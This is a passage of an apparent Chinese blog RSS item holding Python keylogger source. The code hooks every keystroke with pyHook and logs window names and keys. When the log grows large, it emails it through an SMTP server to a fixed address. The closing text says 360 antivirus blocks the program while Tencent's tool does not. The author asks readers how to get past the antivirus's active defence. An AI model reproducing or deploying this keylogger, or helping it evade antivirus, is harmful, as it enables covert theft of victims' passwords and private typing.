    print &quot;WindowName:&quot;, event.WindowName
    print &quot;Position:&quot;, event.Position
    print &quot;Wheel:&quot;, event.Wheel
    print &quot;Injected:&quot;, event.Injected
    print &quot;---&quot;
    # 返回 True 以便将事件传给其它处理程序
    # 注意，这儿如果返回 False ，则鼠标事件将被全部拦截
    # 也就是说你的鼠标看起来会僵在那儿，似乎失去响应了
    return True


def pushEmail(stri):
    #正文
    mail_body = stri
    #发信邮箱
    mail_from = 'xxx@126.com'
    #收信邮箱
    mail_to = ['xxx@qq.com']
    #定义正文
    msg = MIMEText(mail_body)
    #定义标题
    msg['Subject'] = 'this is the title'
    #定义发信人
    msg['From'] = mail_from
    msg['To'] = ';'.join(mail_to)
    #定义发送时间（不定义的可能有的邮件客户端会不显示发送时间）
  #  msg['date'] = time.strftime('%a, %d %b %Y %H:%M:%S %z')

    smtp = smtplib.SMTP()
    #连接SMTP服务器，此处用的126的SMTP服务器
    smtp.connect('smtp.126.com')
    #用户名密码
    smtp.login('xxx@126.com', 'xxx')
    smtp.sendmail(mail_from, mail_to, msg.as_string())
    smtp.quit()
    global str
    str = &quot;&quot;

def onKeyboardEvent(event):
# 监听键盘事件
#print &quot;MessageName:&quot;, event.MessageName
# print &quot;Message:&quot;, event.Message
# print &quot;Time:&quot;, event.Time
    &quot;&quot;&quot;

    :param event:
    :return:
    &quot;&quot;&quot;
    print &quot;Window:&quot;, event.Window
    s = event.WindowName
    print &quot;WindowName:&quot;, s.decode('gbk', 'ignore').encode('utf-8')
    # print &quot;Ascii:&quot;, event.Ascii, chr(event.Ascii)
    print &quot;Key:&quot;, event.Key
    print &quot;KeyID:&quot;, event.KeyID
    global str
    str = str+'    windowName:'+event.WindowName.decode('gbk', 'ignore').encode('utf-8')+'    key:'+event.Key
    # fileHandle = open('test.txt', 'a')
    # fileHandle.writelines('WindowName:'+event.WindowName.decode('gbk', 'ignore').encode('utf-8')+'\n')
    # fileHandle.writelines('Key：'+event.Key +'\n')
    # fileHandle.writelines('*********************'+'\n')
    if len(str) &gt; 50000:
       pushEmail(str)

        #   print &quot;ScanCode:&quot;, event.ScanCode
        #   print &quot;Extended:&quot;, event.Extended
        #    print &quot;Injected:&quot;, event.Injected
        #    print &quot;Alt&quot;, event.Alt
    #  print &quot;Transition&quot;, event.Transition
    print &quot;---&quot;

    # 同鼠标事件监听函数的返回值
    return True


def main():
    # 创建一个“钩子”管理对象
    hm = pyHook.HookManager()

    # 监听所有键盘事件
    hm.KeyDown = onKeyboardEvent
    # 设置键盘“钩子”
    hm.HookKeyboard()

    # 监听所有鼠标事件
    # hm.MouseAll = onMouseEvent
    # 设置鼠标“钩子”
    #hm.HookMouse()
    # 进入循环，如不手动关闭，程序将一直处于监听状态
    pythoncom.PumpMessages(100000)


if __name__ == &quot;__main__&quot;:
    main()</pre><!-- Code inserted with Steve Dunn's Windows Live Writer Code Formatter Plugin.  http://dunnhq.com --></div>

<p>记录后发送邮件到指定邮箱。现在有个关键问题是360会主动防御掉，但是腾讯管家没有任何反应，呵呵。还没想到怎么过主防的办法，知道的同学可以交流下。</p>]]></description>
        <pubDate>Wed, 28 Aug 2013 10:24:23 +0800</pubDate>
        <guid>http://my.oschina.net/chen7/blog/157385</guid>
    </item>
	</channel>
</rss>    